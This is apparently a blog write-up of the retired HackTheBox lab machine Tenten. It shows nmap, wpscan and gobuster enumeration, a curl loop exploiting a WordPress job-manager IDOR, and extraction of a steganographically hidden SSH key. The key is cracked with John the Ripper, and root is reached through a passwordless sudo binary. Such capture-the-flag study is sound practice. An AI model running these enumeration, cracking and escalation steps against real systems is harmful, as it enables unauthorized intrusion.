---
author: "faizul"
title: "Tenten - Retired HackTheBox Machine"
date: 2020-8-2T12:00:06+09:00
description: "Tenten Machine Writeup"
draft: false
hideToc: false
enableToc: true
enableTocContent: false
author: faizul
image: images/htb/htb.png
tags: 
- pentest
- retired
- hackthebox
---

![17b23a928cae1763eeca5574a0c2efcf.png](/images/htb/tenten/7e7bc5f90e9447a1a18259fe404725dc.png)

- 10.10.10.10

## Recon

### Nmap
As usual, i will enum this machine with nmap first

`sudo nmap -sSCV -A --script vuln -T4 -oA nmap/agressive-vuln-scan -iL ip`
The summarized of the nmap scan is that only 2 port are available for attacking which are http 80 and 22 ssh. Once we went to the browser and visit the ip, we will b greeted by this wordpress site.



![c45d509bdfdd6e2f9ba5f83a4212d1c2.png](/images/htb/tenten/eb93d6e89d9f4e22b15b8a9252bfaba0.png)




![154334e4275823c5aa96689df238d163.png](/images/htb/tenten/1bfec60ceee04328861bf8c297f2c0b3.png)


Since it is a wordpress site, i will usually skip gobuster and nikto and straight to wpscan. 

### Wpscan
For wpscan, main two things to enumerate are plugin and user. Plugins in wordpress is really important because outdated plugin left unpatched will open attacking surfaces for wordpress.

enumerate user
`wpscan --url http://10.10.10.10 --enumerate u -o wpscan/enumerate-user`

User enumeration for this site gave user  `takis` as result. 

```code
[i] User(s) Identified:

[+] takis
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.10.10/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

enum plugin
`wpscan --url http://10.10.10.10 --enumerate p -o wpscan/enumerate-plugin`


For plugin, we have one unpatched which is `job-manager`.

```code
[i] Plugin(s) Identified:

[+] job-manager
 | Location: http://10.10.10.10/wp-content/plugins/job-manager/
 | Latest Version: 0.7.25 (up to date)
 | Last Updated: 2015-08-25T22:44:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Job Manager <= 0.7.25 -  Insecure Direct Object Reference (IDOR)
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8167
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6668
 |      - https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/
 |
 | Version: 7.2.5 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.10/wp-content/plugins/job-manager/readme.txt
```


## Initial Foothold / Initial access
In order to get initial access, we need to understand the flow and connection of plugin to the web application function here. 

Since we foun the job-manager plugin left unpatched, i manually crawl the web app manually to enumerate more. 

On the homepage, there is one hyperlink text to the open vacancies to the other page. 

![e92bce2008715fea3846a0413adde0d6.png](/images/htb/tenten/6c436a5a17b34bf1b801972d27279989.png)



![5308310b72416302560f1c10d60001fe.png](/images/htb/tenten/7ec02b63ab9a49e49340787856d1f3a9.png)




![715f13f47952aaa9511c6e873c978ffc.png](/images/htb/tenten/7ee3b4500f3244cb9adee73bd1ed9bda.png)



![0b174b03d41a15bdfc1f23deedc5a94a.png](/images/htb/tenten/985dd29d01134660b8de4087e3a76894.png)

The Pentester job vacancy page have form which we can upload file and this can be leverage into RFI where we upload reverse shell payload on it. The form also can be tested for XSS and SQLi attack. 


But first, lets take a look at vacancy url `http://10.10.10.10/index.php/jobs/apply/8/`. This url where it includes the the id os a post indicates that this might contain some other values.

when we change the url into other value, the post changes. 
`http://10.10.10.10/index.php/jobs/apply/8/`



![56c1c2fbf941e019cde7a4d192416971.png](/images/htb/tenten/d5b140bff94a47f789101e10bfecee66.png)

For this one, we can get to dig more by writing simple bash script to do enumeration. 


`curl -s http://10.10.10.10 | grep '<title>'`
![7e0c2e64c955dce194b7599117dac885.png](/images/htb/tenten/1b85952ee60049db8e2f3d8c58fcdf35.png)

We turn this into loop and full bash script for enum.
```bash
#!/bin/bash

for i in $(seq 1 20)
do
	echo -n "$i: "
	curl -s http://10.10.10.10/index.php/jobs/apply/$i/ | grep '<title>'
```



![56b8e5ec001774aa4c065eab7ccebadf.png](/images/htb/tenten/5f0ae6b790124a02973720584a58da22.png)


Now we have the list, we can create custom wordlist for bruteforcing to confirm the file on `wp-upload` dir. 

To do this, we can use `cat exploit/enum-more.txt | cut -d " " -f 4` where this will give output 
```bash
Hello
Sample
Auto
&#8211;
Jobs
Job
Register
Pen
Application
cube
Application
HackerAccessGranted
Application
index
&#8211;
&#8211;
&#8211;
&#8211;
&#8211;
```
Now, i will just tee this into new file and run gobuster against the 2017/04 folder.

`cat exploit/enum-more.txt | cut -d " " -f 4 | tee loot/custom-wordlist.txt`

`gobuster dir -u http://10.10.10.10/wp-content/uploads/2017/04 -w loot/custom-wordlist.txt -x png,jpg,jpeg -o gobsuter/enum-custom-wordlist`

```code
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.10/wp-content/uploads/2017/04
[+] Threads:        10
[+] Wordlist:       loot/custom-wordlist.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     jpeg,png,jpg
[+] Timeout:        10s
===============================================================
2020/08/31 08:52:12 Starting gobuster
===============================================================
/cube.png (Status: 200)
/HackerAccessGranted.jpg (Status: 200)
===============================================================
2020/08/31 08:52:22 Finished
===============================================================
```

Now, we going to see what is this cube and HackerAccessGranted file about. 

cube
![a29be2cf7a1ba6f2f6dd65986073a880.png](/images/htb/tenten/72f5e54e39ee4d94a2d632fcbe428e14.png)


HackerAccessGranted
![a1c9a546372550b13b7b9e525bc23143.png](/images/htb/tenten/544557eb5d9e4b2a9385c498add2ab83.png)

Download this and we going to dissect hidden strings or anything inside.

Strings
![fce9906e92357147af91281dd2b92fbd.png](/images/htb/tenten/8e3828eefdd748029169bccf6ed2145c.png)

Since there is no hidden strings on the file, we should use another tools called steghide.
![1c537743ff081b415c7a3c33f69dee4e.png](/images/htb/tenten/57394c3a342842cca6afee758fb5ce99.png)


Basically, the image contain hidden stego function of private key ssh to the victim machine. To crack the password, we can use ssh2john and crack it using JohnTheRipper.

First , we change the current private key into john format
`python /usr/share/john/ssh2john id_rsa > john-id_rsa`
![cf136e9cd614018bb706e59a98357121.png](/images/htb/tenten/7e9290ae778b4b45b08a12dec2fdba43.png)

For future reference, the john format and normal private key format is different as shown below
![971ea8ec0a5bc17145ef63ce9ade20b7.png](/images/htb/tenten/30b68c5f5000409ab155fe4c416c0913.png)


Then we can crack this using this command
`sudo john john-id_rsa --fork=4 -w /usr/share/wordlist/rockyou.txt`
![45094f3d4b785fd6ff1d865ddf6cbda0.png](/images/htb/tenten/f985fa777a6242f79eab24a75ad6bdad.png)
We cracked the password, it is `superpassword`. 

We now try to login using the private key and cracked password as enumerated user we done earlier. 

`ssh -i id_rsa takis@10.10.10.10`
![3ca38a94f47e7858b6084ffd7c8526c4.png](/images/htb/tenten/cd446387be58473582a654ac1442124c.png)

We are in the system as user takis and got the user flag.



## Privilege Escalation
In order to root, we can check the permission or any special permission that user takis can do using `sudo -l`. 

![d35c9dbefe0b59546af38dc304509939.png](/images/htb/tenten/b0e28942e3284c8cac3e57650124b444.png)

Basically, takis can run this special `/bin/fuckin` on ALL command without password. Let us see what this binary contain


![f4949c387c7d3d35e8a4c5f87e97bfb8.png](/images/htb/tenten/6e5bd3f8bc994c05ae030d9eaa4956af.png)


So, it can accept up to 4 arguments command. Lets try to run this as sudo and execute bash.

`sudo /bin/fuckin bash`

![0259c3437f454e327bb6db7cf4f07dfa.png](/images/htb/tenten/131ee3bab0654856840b2578f438b246.png)

It works! We are now running as root. 

## Summary


